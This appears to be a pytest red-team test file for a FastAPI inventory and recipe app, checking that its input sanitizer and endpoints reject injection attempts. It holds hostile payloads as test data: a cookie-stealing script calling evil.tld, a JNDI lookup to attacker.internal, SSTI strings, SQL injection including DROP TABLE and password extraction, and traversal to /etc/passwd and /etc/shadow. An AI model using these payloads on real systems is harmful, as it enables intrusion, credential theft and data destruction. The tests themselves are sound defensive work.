"""
Vector Red Team 04 (`tests/security_redteam/test_04_polyglot_injections_sqli_xss_ssti_lfi.py`):
- Políglotas XSS (`<script>`, `javascript:`, `onerror=`, `<svg/onload=`, `data:text/html`).
- Server-Side Template Injection / SSTI (`{{7*7}}`, `{% import os %}`, `${7*7}`).
- SQL Injection clásico y apilado (`' OR '1'='1`, `UNION SELECT`, `; DROP TABLE`, `pg_sleep`).
- Local File Inclusion / Path Traversal (`../../etc/passwd`, `%2e%2e%2f`, bytes nulos `\x00`)
  bloqueados tanto en `xss_sanitizer` como en los fronteras HTTP de los routers FastAPI.
"""
from __future__ import annotations

import httpx
import pytest

from src.core.exceptions import SecurityValidationError
from src.core.guards import (
    clear_revoked_sessions,
    get_rate_limiter,
    sanitize_text_input,
    validate_no_path_traversal,
)
from src.core.security import create_access_token

pytestmark = pytest.mark.security_redteam


@pytest.mark.parametrize(
    ("vector_payload", "expected_error_code"),
    [
        ("<script>fetch('https://evil.tld/?c='+document.cookie)</script>", "XSS_PAYLOAD_BLOCKED"),
        ("jaVaScRiPt:alert(document.domain)", "XSS_PAYLOAD_BLOCKED"),
        ("<img src=x onerror=alert(1)>", "XSS_PAYLOAD_BLOCKED"),
        ("<svg onload=confirm(1)>", "XSS_PAYLOAD_BLOCKED"),
        ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "XSS_PAYLOAD_BLOCKED"),
        ("{{7*7}}", "SSTI_PAYLOAD_BLOCKED"),
        ("{% for x in ().__class__.__base__.__subclasses__() %}{% endfor %}", "SSTI_PAYLOAD_BLOCKED"),
        ("${jndi:ldap://attacker.internal/exploit}", "SSTI_PAYLOAD_BLOCKED"),
        ("Lomo' OR '1'='1", "SQLI_PAYLOAD_BLOCKED"),
        ("1 UNION ALL SELECT username, hashed_password FROM users", "SQLI_PAYLOAD_BLOCKED"),
        ("item; DROP TABLE kardex_movements--", "SQLI_PAYLOAD_BLOCKED"),
        ("1 AND pg_sleep(10)", "SQLI_PAYLOAD_BLOCKED"),
        ("../../etc/passwd", "PATH_TRAVERSAL_BLOCKED"),
        ("..\\..\\windows\\system32\\cmd.exe", "PATH_TRAVERSAL_BLOCKED"),
        ("inyeccion\x00nula", "NULL_BYTE_INJECTION"),
    ],
)
def test_polyglot_xss_ssti_sqli_lfi_and_null_byte_blocked_by_sanitizer(
    vector_payload: str,
    expected_error_code: str,
) -> None:
    """Verifica que `sanitize_text_input` detecte y bloquee cada familia de inyección con su `error_code`."""
    with pytest.raises(SecurityValidationError) as exc_info:
        sanitize_text_input(vector_payload, field_name="redteam_field")
    assert exc_info.value.error_code == expected_error_code


def test_path_traversal_double_url_encoding_and_null_bytes_blocked() -> None:
    """Verifica que `validate_no_path_traversal` bloquee codificación URL doble y bytes nulos."""
    for traversal_attempt in (
        "../../../etc/shadow",
        "%2e%2e%2f%2e%2e%2fetc/passwd",
        "%252e%252e%252fsecret.key",
        "products/prod_1\x00.png",
        "products/prod_1%00.png",
    ):
        with pytest.raises(SecurityValidationError):
            validate_no_path_traversal(traversal_attempt, field_name="entity_id")


async def test_http_router_boundaries_reject_polyglot_payloads_with_422(
    async_client: httpx.AsyncClient,
) -> None:
    """Verifica que los endpoints REST rechacen políglotas XSS/SSTI/SQLi/LFI con HTTP 422 RFC 7807."""
    clear_revoked_sessions()
    get_rate_limiter().reset()

    token = create_access_token(
        user_id=401,
        holding_id="holding_01",
        tenant_id="tenant_rest_a",
        hierarchy_rank=10,
        role_grants=[
            "catalog.products.create",
            "catalog.media.upload",
            "inventory.mermas.create",
            "recipes.escandallos.write",
        ],
        accessible_tenants=["tenant_rest_a"],
    )
    headers = {
        "Authorization": f"Bearer {token}",
        "X-Tenant-ID": "tenant_rest_a",
    }

    # 1. XSS en creación de producto
    xss_resp = await async_client.post(
        "/api/v1/catalog/products",
        headers=headers,
        json={
            "sku": "SKU-001",
            "nombre": "<script>alert('xss')</script>",
            "unidad_compra": "kg",
            "unidad_almacen": "kg",
            "unidad_receta": "g",
            "factor_compra_a_almacen": "1",
            "factor_almacen_a_receta": "1000",
            "costo_compra_neto": "5000",
        },
    )
    assert xss_resp.status_code == 422
    assert xss_resp.json()["error_code"] == "XSS_PAYLOAD_BLOCKED"

    # 2. SSTI en reporte de merma
    ssti_resp = await async_client.post(
        "/api/v1/inventory/mermas",
        headers=headers,
        json={
            "producto_id": 10,
            "bodega_id": 1,
            "quantity": "1",
            "unit_cost": "1000",
            "reason": "Merma sospechosa {{config.__class__.__init__.__globals__}}",
        },
    )
    assert ssti_resp.status_code == 422
    assert ssti_resp.json()["error_code"] == "SSTI_PAYLOAD_BLOCKED"

    # 3. SQLi en nombre de escandallo
    sqli_resp = await async_client.post(
        "/api/v1/recipes/escandallos",
        headers=headers,
        json={
            "recipe_id": 99,
            "name": "Plato'; DROP TABLE recipes--",
            "yield_portions": "1",
            "net_price": "10000",
            "lines": [
                {"ingredient_id": 1, "quantity": "1", "unit_cost": "2000", "waste_pct": "0"}
            ],
        },
    )
    assert sqli_resp.status_code == 422
    assert sqli_resp.json()["error_code"] == "SQLI_PAYLOAD_BLOCKED"

    # 4. Path Traversal / LFI en campo de texto sanitizado y en filename de subida multimedia
    lfi_prod_resp = await async_client.post(
        "/api/v1/catalog/products",
        headers=headers,
        json={
            "sku": "../../etc/passwd",
            "nombre": "Insumo Normal",
            "unidad_compra": "kg",
            "unidad_almacen": "kg",
            "unidad_receta": "g",
            "factor_compra_a_almacen": "1",
            "factor_almacen_a_receta": "1000",
            "costo_compra_neto": "5000",
        },
    )
    assert lfi_prod_resp.status_code == 422
    assert lfi_prod_resp.json()["error_code"] == "PATH_TRAVERSAL_BLOCKED"

    lfi_media_resp = await async_client.post(
        "/api/v1/catalog/media/upload",
        headers=headers,
        json={
            "filename": "../../etc/passwd.webp",
            "category": "products",
            "entity_id": "prod_1",
            "content_base64": "UklGRiQAAABXRUJQVlA4IA==",
        },
    )
    assert lfi_media_resp.status_code == 422
    assert lfi_media_resp.json()["error_code"] == "UNSAFE_FILENAME"
